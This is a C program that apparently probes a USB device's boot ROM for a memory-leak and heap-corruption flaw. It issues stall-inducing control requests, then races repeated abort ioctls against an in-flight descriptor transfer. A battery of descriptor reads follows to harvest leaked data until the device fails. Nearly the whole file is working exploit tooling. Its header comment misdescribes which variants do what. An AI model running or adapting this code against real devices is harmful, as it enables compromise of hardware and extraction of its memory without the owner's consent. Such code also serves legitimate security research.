/* A7 heap-baseline discriminator probes.
 * variant 0: (2,3,0x80) primer, then two probes (control; known dead).
 * variant 1..6: historical single-cancel depths (kept for reference).
 * variant 7+: hammer-cancel 0xC0 primer preceded by N string reads
 *   (baseline compensation sweep), then a sync leak battery.
 */
#include <sys/ioctl.h>
#include <dev/usb/usb.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifndef USB_ABORT_REQUEST
#define USB_ABORT_REQUEST _IO('U', 118)
#endif

static long
now_us(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (long)ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static void
set_timeout(int fd, int ms)
{
	(void)ioctl(fd, USB_SET_TIMEOUT, &ms);
}

static void
do_req(int fd, const char *tag, uint8_t rt, uint8_t reqno, uint16_t val,
    uint16_t idx, uint16_t len, int timeout_ms)
{
	struct usb_ctl_request req;
	char data[256];
	long t0, us;
	int rc;

	memset(&req, 0, sizeof(req));
	memset(data, 0, sizeof(data));
	req.ucr_request.bmRequestType = rt;
	req.ucr_request.bRequest = reqno;
	USETW(req.ucr_request.wValue, val);
	USETW(req.ucr_request.wIndex, idx);
	USETW(req.ucr_request.wLength, len);
	req.ucr_data = data;
	set_timeout(fd, timeout_ms);
	t0 = now_us();
	rc = ioctl(fd, USB_DO_REQUEST, &req);
	us = now_us() - t0;
	printf("%-26s r=%d errno=%d actlen=%d %ldus b=%02x%02x%02x%02x %c%c%c%c\n",
	    tag, rc, errno, req.ucr_actlen, us,
	    (unsigned char)data[0], (unsigned char)data[1],
	    (unsigned char)data[2], (unsigned char)data[3],
	    (data[0] > 31 && data[0] < 127) ? data[0] : '.',
	    (data[1] > 31 && data[1] < 127) ? data[1] : '.',
	    (data[2] > 31 && data[2] < 127) ? data[2] : '.',
	    (data[3] > 31 && data[3] < 127) ? data[3] : '.');
}

struct async_ctx {
	int fd;
	volatile int started;
	volatile int done;
	int ret;
	int err;
	int actlen;
};

static void *
async_thread(void *arg)
{
	struct async_ctx *ctx = arg;
	struct usb_ctl_request req;
	char data[256];

	memset(&req, 0, sizeof(req));
	req.ucr_request.bmRequestType = 0x80;
	req.ucr_request.bRequest = 6;
	USETW(req.ucr_request.wValue, 0x0304);
	USETW(req.ucr_request.wIndex, 0x040a);
	USETW(req.ucr_request.wLength, 0xc0);
	req.ucr_data = data;
	ctx->started = 1;
	ctx->ret = ioctl(ctx->fd, USB_DO_REQUEST, &req);
	ctx->err = errno;
	ctx->actlen = req.ucr_actlen;
	ctx->done = 1;
	return NULL;
}

/* Reference-form primer: hammer aborts from thread start; the first
 * abort that lands in flight cancels the transfer close to its actual
 * submission, like the reference 10 us deadline. */
static unsigned
stall_hammer(int fd)
{
	struct async_ctx ctx;
	pthread_t th;
	long t_all;
	unsigned cancel_us = 0;

	memset(&ctx, 0, sizeof(ctx));
	ctx.fd = fd;
	set_timeout(fd, 5000);
	if (pthread_create(&th, NULL, async_thread, &ctx) != 0)
		return 0;
	while (!ctx.started)
		;
	t_all = now_us();
	while (now_us() - t_all < 3000) {
		(void)ioctl(fd, USB_ABORT_REQUEST);
		if (ctx.done) {
			cancel_us = (unsigned)(now_us() - t_all);
			break;
		}
	}
	while (!ctx.done)
		;
	pthread_join(th, NULL);
	printf("[B3] hammer cancel@%uus ret=%d errno=%d actlen=%d\n",
	    cancel_us, ctx.ret, ctx.err, ctx.actlen);
	return cancel_us;
}

/* Count how many sync leaks the ROM answers with data before it dies. */
static void
battery(int fd, int count)
{
	int i;

	for (i = 0; i < count; i++) {
		char tag[32];

		snprintf(tag, sizeof(tag), "[L] leak #%d", i);
		do_req(fd, tag, 0x80, 6, 0x0304, 0x040a, 0x40, 100);
	}
}

int
main(int argc, char **argv)
{
	int fd, variant, i, n;

	if (argc < 3) {
		fprintf(stderr, "usage: %s /dev/ugenN.00 variant\n", argv[0]);
		return 2;
	}
	fd = open(argv[1], O_RDWR);
	if (fd < 0) {
		perror("open");
		return 2;
	}
	variant = atoi(argv[2]);
	printf("=== variant %d ===\n", variant);

	switch (variant) {
	case 0:
		/* Reference primer with no prelude (control). */
		do_req(fd, "[A] devdesc", 0x80, 6, 0x0100, 0, 18, 100);
		do_req(fd, "[B]  stall (2,3,0x80)", 0x02, 3, 0, 0x80, 0, 10);
		do_req(fd, "[C1] leak after", 0x80, 6, 0x0304, 0x040a, 0x40, 100);
		do_req(fd, "[C2] devdesc after", 0x80, 6, 0x0100, 0, 18, 100);
		break;
	case 1:
		/* Hammer primer plus the battery. */
		stall_hammer(fd);
		battery(fd, 24);
		break;
	default:
		/* Baseline compensation: N string reads before the
		 * hammer primer, then the leak battery. */
		n = 2 << (variant - 2);
		for (i = 0; i < n; i++)
			do_req(fd, "[P] prelude read", 0x80, 6, 0x0304, 0x040a, 0x40, 100);
		printf("[P] %d prelude reads done\n", n);
		stall_hammer(fd);
		battery(fd, 12);
		break;
	}

	return 0;
}
